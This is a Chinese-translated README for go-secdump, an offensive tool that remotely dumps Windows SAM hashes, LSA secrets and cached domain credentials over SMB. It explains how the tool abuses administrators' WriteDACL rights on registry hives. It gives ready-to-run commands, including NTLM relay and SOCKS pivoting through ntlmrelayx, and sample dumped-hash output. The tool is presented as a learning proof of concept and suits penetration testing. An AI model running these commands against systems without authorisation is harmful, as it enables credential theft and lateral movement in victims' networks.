# go-secdump



## 描述



包 go-secdump 是一个工具，用于远程从 SAM 注册表配置单元提取哈希值以及从 SECURITY 配置单元提取 LSA 机密和缓存哈希值，无需任何远程代理，也无需接触磁盘。

[该工具建立在库go-smb](https://github.com/jfjallid/go-smb)之上 ，并使用它来与 Windows 远程注册表通信，以直接从内存中检索注册表项。

它作为一种学习体验和概念证明而建立，即应该可以从 SAM 配置单元和 LSA 机密以及域缓存凭据中远程检索 NT 哈希，而不必先将注册表配置单元保存到磁盘然后在本地解析它们。

要克服的主要问题是 SAM 和 SECURITY 配置单元只能由 NT AUTHORITY\SYSTEM 读取。但是，我注意到本地组管理员对注册表配置单元具有 WriteDACL 权限，因此可以用来临时授予自身读取权限以检索机密，然后恢复原始权限。

## 致谢



该项目中的大部分代码都是受到 Impacket 的 secdump 启发/借鉴的，但转换为远程访问 Windows 注册表并仅访问所需的注册表项。

下面列出了一些有助于理解注册表结构和加密方法的其他来源：

https://www.passcape.com/index.php?section=docsys&cmd=details&id=23

http://www.beginningtoseethelight.org/ntsecurity/index.htm

https://social.technet.microsoft.com/Forums/en-US/6e3c4486-f3a1-4d4e-9f5c-bdacdb245cfd/how-are-ntlm-hashes-stored-under-the-v-key-in-the-sam?forum=win10itprogeneral

## 用法



```
Usage: ./go-secdump [options]

options:
      --host <target>       Hostname or ip address of remote server
  -P, --port <port>         SMB Port (default 445)
  -d, --domain <domain>     Domain name to use for login
  -u, --user <username>     Username
  -p, --pass <pass>         Password
  -n, --no-pass             Disable password prompt and send no credentials
      --hash <NT Hash>      Hex encoded NT Hash for user password
      --local               Authenticate as a local user instead of domain user
      --dump                Saves the SAM and SECURITY hives to disk and
                            transfers them to the local machine.
      --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
      --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
      --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
      --backup-dacl         Save original DACLs to disk before modification
      --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
      --backup-file         Filename for DACL backup (default dacl.backup)
      --relay               Start an SMB listener that will relay incoming
                            NTLM authentications to the remote server and
                            use that connection. NOTE that this forces SMB 2.1
                            without encryption.
      --relay-port <port>   Listening port for relay (default 445)
      --socks-host <target> Establish connection via a SOCKS5 proxy server
      --socks-port <port>   SOCKS5 proxy port (default 1080)
  -t, --timeout             Dial timeout in seconds (default 5)
      --noenc               Disable smb encryption
      --smb2                Force smb 2.1
      --debug               Enable debug logging
      --verbose             Enable verbose logging
  -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.
  -v, --version             Show version
```



## 更改 DACL



go-secdump 将自动尝试修改然后恢复所需注册表项的 DACL。但是，如果在恢复过程中出现问题（例如网络断开连接或其他中断），则远程注册表将保留修改后的 DACL。

使用该`--backup-dacl`参数可以存储修改前的原始 DACL 的序列化副本。如果发生连接问题，可以使用该`--restore-dacl`参数从文件中恢复 DACL。

## 例子



转储所有注册表机密

```
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local
or
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2
```



仅转储 SAM、LSA 或 DCC2 缓存机密

```
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2
```



### NTLM 中继



使用 NTLM 中继转储注册表机密

启动监听器

```
./go-secdump --host 192.168.0.100 -n --relay
```



以某种方式从具有 192.168.0.100 管理权限的客户端触发对您的机器的身份验证，然后等待转储的机密。

```
YYYY/MM/DD HH:MM:SS smb [Notice] Client connected from 192.168.0.30:49805
YYYY/MM/DD HH:MM:SS smb [Notice] Client (192.168.0.30:49805) successfully authenticated as (domain.local\Administrator) against (192.168.0.100:445)!
Net-NTLMv2 Hash: Administrator::domain.local:34f4533b697afc39:b4dcafebabedd12deadbeeffef1cea36:010100000deadbeef59d13adc22dda0
2023/12/13 14:47:28 [Notice] [+] Signing is NOT required
2023/12/13 14:47:28 [Notice] [+] Login successful as domain.local\Administrator
[*] Dumping local SAM hashes
Name: Administrator
RID: 500
NT: 2727D7906A776A77B34D0430EAACD2C5

Name: Guest
RID: 501
NT: <empty>

Name: DefaultAccount
RID: 503
NT: <empty>

Name: WDAGUtilityAccount
RID: 504
NT: <empty>

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: 0x15deadbeef645e75b38a50a52bdb67b4
$MACHINE.ACC:plain_password_hex:47331e26f48208a7807cafeababe267261f79fdc38c740b3bdeadbeef7277d696bcafebabea62bb5247ac63be764401adeadbeef4563cafebabe43692deadbeef03f...
[*] DPAPI_SYSTEM
dpapi_machinekey: 0x8afa12897d53deadbeefbd82593f6df04de9c100
dpapi_userkey: 0x706e1cdea9a8a58cafebabe4a34e23bc5efa8939
[*] NL$KM
NL$KM: 0x53aa4b3d0deadbeef42f01ef138c6a74
[*] Dumping cached domain credentials (domain/username:hash)
DOMAIN.LOCAL/Administrator:$DCC2$10240#Administrator#97070d085deadbeef22cafebabedd1ab
...
```



### SOCKS代理



使用上游 SOCKS5 代理转储机密，以进行枢转或利用 Impacket 的 ntlmrelayx.py SOCKS 服务器功能。

当使用 ntlmrelayx.py 作为上行代理时，提供的用户名必须与经过身份验证的客户端匹配，但密码可以为空。

```
./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server
...

./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080
```